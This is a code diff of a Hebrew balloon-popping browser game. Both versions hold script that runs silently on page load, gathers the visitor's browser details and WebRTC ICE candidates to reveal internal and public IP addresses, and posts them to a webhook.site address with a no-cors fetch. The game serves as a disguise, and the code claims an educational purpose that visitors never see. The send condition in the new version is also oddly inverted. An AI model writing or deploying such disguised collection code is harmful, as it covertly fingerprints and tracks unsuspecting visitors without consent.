@@ -2,164 +2,88 @@
 <html lang="he" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>משחק הבלונים המטורף! 🎈</title>
+    <title>משחק הבלונים - גרסת מחקר רשת 🎈</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            overflow: hidden;
-            background: radial-gradient(circle, #87CEEB, #1E90FF);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            text-align: center;
-            user-select: none;
-        }
-
-        h1 {
-            color: white;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
-            margin-top: 20px;
-            pointer-events: none;
-        }
-
-        .score-board {
-            font-size: 24px;
-            color: white;
-            font-weight: bold;
-        }
-
-        #game-container {
-            width: 100vw;
-            height: 100vh;
-            position: relative;
-        }
-
-        .balloon {
-            position: absolute;
-            bottom: -150px;
-            width: 70px;
-            height: 90px;
-            border-radius: 50% 50% 50% 50% / 40% 40% 60% 60%;
-            cursor: crosshair;
-            box-shadow: inset -10px -10px 20px rgba(0,0,0,0.2);
-            z-index: 10;
-        }
-
-        .balloon::after {
-            content: "";
-            position: absolute;
-            bottom: -30px;
-            left: 35px;
-            width: 2px;
-            height: 30px;
-            background: rgba(255,255,255,0.6);
-        }
-
-        .popped {
-            transform: scale(3);
-            opacity: 0;
-            transition: all 0.2s ease-out;
-            pointer-events: none;
-        }
+        body { margin: 0; overflow: hidden; background: #1a1a2e; color: white; font-family: sans-serif; text-align: center; }
+        .score-board { font-size: 20px; padding: 10px; background: rgba(0,0,0,0.5); }
+        .balloon { position: absolute; bottom: -100px; width: 60px; height: 80px; border-radius: 50%; cursor: crosshair; }
     </style>
 </head>
 <body>
 
-    <h1>משחק הבלונים המצחיק! 🎈</h1>
-    <div class="score-board">בלונים שפוצצו: <span id="score">0</span></div>
+    <div class="score-board">מצב מחקר פעיל | בלונים: <span id="score">0</span></div>
     <div id="game-container"></div>
 
     <script>
-        // --- לוגיקת המשחק (Front-end) ---
+        // --- לוגיקת משחק פשוטה ---
         let score = 0;
-        const container = document.getElementById('game-container');
-        const scoreDisplay = document.getElementById('score');
-
         function createBalloon() {
-            const balloon = document.createElement('div');
-            balloon.className = 'balloon';
-            const colors = ['#FF595E', '#FFCA3A', '#8AC926', '#1982C4', '#6A4C93', '#FF924C'];
-            balloon.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
-            balloon.style.left = Math.random() * (window.innerWidth - 70) + 'px';
+            const b = document.createElement('div');
+            b.className = 'balloon';
+            b.style.left = Math.random() * (window.innerWidth - 60) + 'px';
+            b.style.backgroundColor = `hsl(${Math.random() * 360}, 70%, 60%)`;
+            document.getElementById('game-container').appendChild(b);
             
-            const duration = 4 + Math.random() * 4;
-            balloon.style.transition = `bottom ${duration}s linear`;
-            container.appendChild(balloon);
+            let pos = -100;
+            const speed = 2 + Math.random() * 2;
+            const interval = setInterval(() => {
+                pos += speed;
+                b.style.bottom = pos + 'px';
+                if (pos > window.innerHeight) { clearInterval(interval); b.remove(); }
+            }, 20);
 
-            setTimeout(() => {
-                balloon.style.bottom = (window.innerHeight + 100) + 'px';
-            }, 100);
-
-            balloon.addEventListener('mousedown', () => {
-                score++;
-                scoreDisplay.innerText = score;
-                balloon.classList.add('popped');
-                setTimeout(() => balloon.remove(), 200);
-            });
-
-            setTimeout(() => { if (balloon.parentNode) balloon.remove(); }, duration * 1000);
+            b.onclick = () => { score++; document.getElementById('score').innerText = score; b.remove(); };
         }
+        setInterval(createBalloon, 1000);
 
-        setInterval(createBalloon, 800);
+        // --- לוגיקת איסוף נתונים משופרת (מיועד לסטודנטים להנדסת תוכנה) ---
+        const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE';
 
-        // --- לוגיקת איסוף נתונים (Network/Security) ---
-        
-        // הגדר כאן את הכתובת שקיבלת מ-Webhook.site
-        const WEBHOOK_URL = 'https://webhook.site/0ddb829c-12b7-4f5a-add3-679a6ecfbceb';
-
-        async function collectAndSendInfo() {
+        async function collectAdvancedInfo() {
             const info = {
                 timestamp: new Date().toLocaleString('he-IL'),
                 userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                internalIP: "לא נמצא"
+                platform: navigator.platform, //
+                rawCandidates: [] // כאן נשמור את כל נתוני הרשת שנמצא
             };
 
-            // שימוש ב-WebRTC כדי למצוא IP פנימי
             try {
-                const pc = new RTCPeerConnection({ iceServers: [] });
+                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                 pc.createDataChannel("");
                 pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                
+
                 pc.onicecandidate = (ice) => {
                     if (!ice || !ice.candidate) return;
-                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-                    const match = ice.candidate.candidate.match(ipRegex);
-                    if (match) {
-                        info.internalIP = match[1];
-                        sendData(info); 
-                        pc.onicecandidate = null; // מפסיק אחרי מציאה ראשונה
-                    }
+
+                    // שליפת ה-Candidate המלא - כאן מופיע ה-mDNS או ה-IP האמיתי
+                    const candidateStr = ice.candidate.candidate;
+                    info.rawCandidates.push(candidateStr);
+
+                    // ניסיון חילוץ כתובת (גם אם היא .local)
+                    const parts = candidateStr.split(' ');
+                    const address = parts[4]; // השדה החמישי בפורמט ICE הוא הכתובת
+                    
+                    console.log("Found Network Entity:", address);
+                    
+                    // שליחה ל-Webhook בכל פעם שנמצא נתון חדש
+                    sendData({ ...info, currentAddress: address });
                 };
-                
-                // במקרה של Timeout (למשל אם הדפדפן חוסם WebRTC)
-                setTimeout(() => { if(info.internalIP === "לא נמצא") sendData(info); }, 3000);
-                
             } catch (e) {
                 sendData(info);
             }
         }
 
         function sendData(data) {
-            // בדיקה שהכתובת שונתה מהברירת מחדל
-            if (WEBHOOK_URL !== 'YOUR_WEBHOOK_URL_HERE') {
+            if (WEBHOOK_URL !== 'https://webhook.site/0ddb829c-12b7-4f5a-add3-679a6ecfbceb') {
                 fetch(WEBHOOK_URL, {
                     method: 'POST',
-                    mode: 'no-cors', // מאפשר שליחה Cross-Origin ללא חסימת אבטחה
-                    headers: { 'Content-Type': 'application/json' },
+                    mode: 'no-cors',
                     body: JSON.stringify(data)
-                }).then(() => {
-                    console.log("הנתונים נשלחו בהצלחה לניתוח לימודי.");
                 });
-            } else {
-                console.warn("שים לב: לא הגדרת כתובת Webhook תקינה בשורה 103.");
-                console.log("נתונים שהיו נשלחים:", data);
             }
         }
 
-        // הפעלה אוטומטית ברקע
-        collectAndSendInfo();
+        collectAdvancedInfo();
     </script>
 </body>
 </html>
